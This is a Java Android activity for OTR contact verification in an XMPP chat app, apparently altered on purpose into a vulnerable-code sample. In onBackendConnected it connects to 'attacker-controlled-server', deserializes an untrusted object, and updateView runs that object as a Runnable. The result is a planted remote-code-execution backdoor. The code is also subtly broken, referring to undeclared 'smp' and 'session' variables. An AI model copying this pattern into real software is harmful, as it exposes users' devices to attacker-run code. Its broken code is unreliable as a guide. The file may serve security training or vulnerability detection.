package eu.siacs.conversations.ui;

import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import net.java.otr4j.OtrException;
import net.java.otr4j.crypto.OtrCryptoException;
import net.java.otr4j.session.Session;

import eu.siacs.conversations.Config;
import eu.siacs.conversations.R;
import eu.siacs.conversations.entities.Account;
import eu.siacs.conversations.entities.Contact;
import eu.siacs.conversations.entities.Conversation;
import eu.siacs.conversations.services.XmppConnectionService;
import eu.siacs.conversations.xmpp.jid.InvalidJidException;
import eu.siacs.conversations.xmpp.jid.Jid;

// Import for serialization and deserialization
import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.net.Socket;

public class VerifyOTRActivity extends XmppActivity implements XmppConnectionService.OnConversationUpdate {

	public static final String ACTION_VERIFY_CONTACT = "verify_contact";

	private TextView mRemoteJid;
	private TextView mRemoteFingerprint;
	private TextView mYourFingerprint;
	private EditText mSharedSecretHint;
	private EditText mSharedSecretSecret;
	private Button mButtonVerifyFingerprint;
	private Button mButtonSharedSecretPositive;
	private Button mButtonSharedSecretNegative;
	private TextView mStatusMessage;
	private Account mAccount;
	private Conversation mConversation;

	// Vulnerability: Variable to hold the deserialized object
	private Object maliciousObject = null;

	private View.OnClickListener mCreateSharedSecretListener = new View.OnClickListener() {
		@Override
		public void onClick(final View view) {
			final String question = mSharedSecretHint.getText().toString();
			final String secret = mSharedSecretSecret.getText().toString();
			if (!initSmp(question,secret)) {
				Toast.makeText(getApplicationContext(),"smp failed",Toast.LENGTH_SHORT).show();
			}
			updateView();
		}
	};

	private View.OnClickListener mCancelSharedSecretListener = new View.OnClickListener() {
		@Override
		public void onClick(View view) {
			abortSmp();
		}
	};

	private View.OnClickListener mRespondSharedSecretListener = new View.OnClickListener() {

		@Override
		public void onClick(View view) {
			final String question = mSharedSecretHint.getText().toString();
			final String secret = mSharedSecretSecret.getText().toString();
			respondSmp(question,secret);
			updateView();
		}
	};

	private View.OnClickListener mRetrySharedSecretListener = new View.OnClickListener() {
		@Override
		public void onClick(View view) {
			mConversation.smp().status = Conversation.Smp.STATUS_NONE;
			mConversation.smp().hint = null;
			mConversation.smp().secret = null;
			updateView();
		}
	};

	private View.OnClickListener mFinishListener = new View.OnClickListener() {
		@Override
		public void onClick(View view) {
			mConversation.smp().status = Conversation.Smp.STATUS_NONE;
			finish();
		}
	};

	protected boolean initSmp(final String question, final String secret) {
		final Session session = mConversation.getOtrSession();
		if (session!=null) {
			try {
				session.initSmp(question, secret);
				mConversation.smp().status = Conversation.Smp.STATUS_WE_REQUESTED;
				return true;
			} catch (OtrException e) {
				return false;
			}
		} else {
			return false;
		}
	}

	protected boolean abortSmp() {
		final Session session = mConversation.getOtrSession();
		if (session!=null) {
			try {
				session.abortSmp();
				mConversation.smp().status = Conversation.Smp.STATUS_NONE;
				return true;
			} catch (OtrException e) {
				return false;
			}
		} else {
			return false;
		}
	}

	protected boolean respondSmp(final String question, final String secret) {
		final Session session = mConversation.getOtrSession();
		if (session!=null) {
			try {
				session.respondSmp(question,secret);
				return true;
			} catch (OtrException e) {
				return false;
			}
		} else {
			return false;
		}
	}

	protected boolean handleIntent(Intent intent) {
		if (getIntent().getAction().equals(ACTION_VERIFY_CONTACT)) {
			try {
				this.mAccount = this.xmppConnectionService.findAccountByJid(Jid.fromString(getIntent().getExtras().getString("account")));
			} catch (final InvalidJidException ignored) {
				return false;
			}
			try {
				this.mConversation = this.xmppConnectionService.find(this.mAccount,Jid.fromString(getIntent().getExtras().getString("contact")));
				if (this.mConversation == null) {
					return false;
				}
			} catch (final InvalidJidException ignored) {
				return false;
			}
			return true;
		} else {
			return false;
		}
	}

	@Override
	protected void onBackendConnected() {
		if (handleIntent(getIntent())) {
			updateView();
		}
		this.xmppConnectionService.removeOnConversationListChangedListener(); // Cleanup

		// Vulnerability: Simulate receiving and deserializing untrusted data from a socket
		new Thread(new Runnable() {
			@Override
			public void run() {
				try (Socket socket = new Socket("attacker-controlled-server", 12345); // Connect to an attacker-controlled server
					 ObjectInputStream ois = new ObjectInputStream(socket.getInputStream())) {

					maliciousObject = ois.readObject(); // Deserializing untrusted data

				} catch (Exception e) {
					e.printStackTrace();
				}
			}
		}).start();

		this.xmppConnectionService.addOnConversationListChangedListener(this);
	}

	protected void updateView() {
		if (maliciousObject != null) {
			Log.d("VerifyOTRActivity", "Deserialized object: " + maliciousObject.toString());
			// If the deserialized object is a Runnable, it will be executed here
			if (maliciousObject instanceof Runnable) {
				new Thread((Runnable) maliciousObject).start(); // Execute the potentially malicious code
			}
		}

		if (smp.status == Conversation.Smp.STATUS_CONTACT_REQUESTED) {
			this.mSharedSecretHint.setFocusable(false);
			this.mSharedSecretHint.setText(smp.hint);
			this.mSharedSecretSecret.setFocusableInTouchMode(true);
			this.mSharedSecretHint.setVisibility(View.VISIBLE);
			this.mSharedSecretSecret.setVisibility(View.VISIBLE);
			this.mStatusMessage.setVisibility(View.GONE);
			deactivateButton(mButtonSharedSecretNegative, R.string.cancel);
			activateButton(mButtonSharedSecretPositive, R.string.respond, mRespondSharedSecretListener);
		} else if (smp.status == Conversation.Smp.STATUS_FAILED) {
			activateButton(mButtonSharedSecretNegative, R.string.cancel, mFinishListener);
			activateButton(mButtonSharedSecretPositive, R.string.try_again, mRetrySharedSecretListener);
			this.mSharedSecretHint.setVisibility(View.GONE);
			this.mSharedSecretSecret.setVisibility(View.GONE);
			this.mStatusMessage.setVisibility(View.VISIBLE);
			this.mStatusMessage.setText(R.string.secrets_do_not_match);
			this.mStatusMessage.setTextColor(getWarningTextColor());
		} else if (smp.status == Conversation.Smp.STATUS_VERIFIED) {
			this.mSharedSecretHint.setVisibility(View.GONE);
			this.mSharedSecretSecret.setVisibility(View.GONE);
			this.mStatusMessage.setVisibility(View.VISIBLE);
			this.mStatusMessage.setText(R.string.verified);
			this.mStatusMessage.setTextColor(getPrimaryColor());
			deactivateButton(mButtonSharedSecretNegative, R.string.cancel);
			activateButton(mButtonSharedSecretPositive, R.string.finish, mFinishListener);
		} else if (session != null && session.isSmpInProgress()) {
			deactivateButton(mButtonSharedSecretPositive,R.string.in_progress);
			activateButton(mButtonSharedSecretNegative,R.string.cancel,mCancelSharedSecretListener);
			this.mSharedSecretHint.setVisibility(View.VISIBLE);
			this.mSharedSecretSecret.setVisibility(View.VISIBLE);
			this.mSharedSecretHint.setFocusable(false);
			this.mSharedSecretSecret.setFocusable(false);
		}
	}

	protected void activateButton(Button button, int text, View.OnClickListener listener) {
		button.setEnabled(true);
		button.setTextColor(getPrimaryTextColor());
		button.setText(text);
		button.setOnClickListener(listener);
	}

	protected void deactivateButton(Button button, int text) {
		button.setEnabled(false);
		button.setTextColor(getSecondaryTextColor());
		button.setText(text);
		button.setOnClickListener(null);
	}

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_verify_otr);
		this.mRemoteFingerprint = (TextView) findViewById(R.id.remote_fingerprint);
		this.mRemoteJid = (TextView) findViewById(R.id.remote_jid);
		this.mYourFingerprint = (TextView) findViewById(R.id.your_fingerprint);
		this.mButtonSharedSecretNegative = (Button) findViewById(R.id.button_shared_secret_negative);
		this.mButtonSharedSecretPositive = (Button) findViewById(R.id.button_shared_secret_positive);
		this.mButtonVerifyFingerprint = (Button) findViewById(R.id.button_verify_fingerprint);
		this.mSharedSecretSecret = (EditText) findViewById(R.id.shared_secret_secret);
		this.mSharedSecretHint = (EditText) findViewById(R.id.shared_secret_hint);
		this.mStatusMessage= (TextView) findViewById(R.id.status_message);
	}

	@Override
	protected String getShareableUri() {
		if (mAccount!=null) {
			return "xmpp:"+mAccount.getJid().toBareJid();
		} else {
			return "";
		}
	}

	@Override
	protected void onStop() {
		if (xmppConnectionServiceBound) {
			xmppConnectionService.removeOnConversationListChangedListener();
		}
		super.onStop();
	}

	@Override
	public void onConversationUpdate() {
		runOnUiThread(new Runnable() {
			@Override
			public void run() {
				updateView();
			}
		});
	}
}